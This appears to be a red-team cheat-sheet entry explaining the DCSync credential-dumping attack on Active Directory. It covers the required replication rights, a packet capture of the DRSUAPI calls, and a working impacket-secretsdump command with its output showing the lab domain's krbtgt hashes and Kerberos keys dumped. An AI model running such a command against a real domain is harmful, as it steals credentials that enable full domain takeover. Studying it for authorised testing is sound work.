# AD Creds


## DCSync

To perform DCSync we need the following extended rights over the LDAP domain
object:
- [DS-Replication-Get-Changes](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes): To replicate domain data.
- [DS-Replication-Get-Changes-All](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all): To replicate secret domain data.
- [DS-Replication-Get-Changes-In-Filtered-Set](https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-in-filtered-set)* (may be needed)

The DCSync is based on domain controllers synchronization mechanism, that is
performed by calling the `DsGetNCChanges` method of the `DRSUAPI` (Directory
Replication Service API) interface.

Here are an example of network capture that includes the RPC methods used by
DCSync (in this case by using [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)):
```
$ tshark -i eth0 -f 'host 192.168.0.1' -Y 'dcerpc'
Capturing on 'eth0'
...
   54 0.083966991 192.168.0.137 → 192.168.0.1 DRSUAPI 198 DsBind request
   55 0.084535039 192.168.0.1 → 192.168.0.137 DRSUAPI 210 DsBind response
   56 0.086551714 192.168.0.137 → 192.168.0.1 DRSUAPI 174 DsGetDomainControllerInfo request
   57 0.087849737 192.168.0.1 → 192.168.0.137 DRSUAPI 1026 DsGetDomainControllerInfo response
   58 0.091090748 192.168.0.137 → 192.168.0.1 DRSUAPI 206 DsCrackNames request
   59 0.091809885 192.168.0.1 → 192.168.0.137 DRSUAPI 290 DsCrackNames response
   60 0.094941159 192.168.0.137 → 192.168.0.1 DRSUAPI 406 DsGetNCChanges request
   61 0.096131441 192.168.0.1 → 192.168.0.137 DCERPC 4338 Response: call_id: 5, Fragment: 1st, Ctx: 0
```

To perform DCSync we can use [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) from [impacket](https://github.com/fortra/impacket).

> **Warning**: Avoid performing DCSync to extract all the domain user hashes since
> in big environments this operation can consume a lot of memory of the DC and
> crash it. Better extract specific user hashes.

Here is an example using secretsdump to retrieve the `krbtgt` account hashes:
```
$ impacket-secretsdump hack.lab/Administrator:'P4ssw0rd'@dc01.hack.lab \
-just-dc-user krbtgt -outputfile 'dcsync-hack.lab'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c08839cfa53deca0f9b1e378bf152d4e:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:2014d58cba0362c09ca911084df410c81327be8853bcc955fc85ef3e1a977cb0
krbtgt:aes128-cts-hmac-sha1-96:44fe780bedfb59e36a43f26c34d7a782
krbtgt:des-cbc-md5:7016a6b07b94cbc9
[*] Cleaning up...

$ ls dcsync-hack.lab*
dcsync-hack.lab.ntds  dcsync-hack.lab.ntds.cleartext  dcsync-hack.lab.ntds.kerberos
```

Tools:
- [secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)

Resources:
- [The Hacker Recipes: DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync)
- [Red Team Notes: DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
